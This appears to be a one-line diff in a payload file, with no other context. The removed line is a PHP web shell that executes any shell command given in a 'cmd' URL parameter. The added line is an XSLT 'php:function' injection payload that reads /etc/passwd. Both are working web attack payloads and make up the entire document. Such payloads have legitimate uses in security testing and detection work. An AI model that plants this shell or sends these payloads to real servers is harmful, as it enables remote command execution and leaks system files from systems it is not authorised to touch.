@@ -1,1 +1,1 @@
-<?php system($_GET["cmd"]); ?>
+php:function('file_get_contents','/etc/passwd')
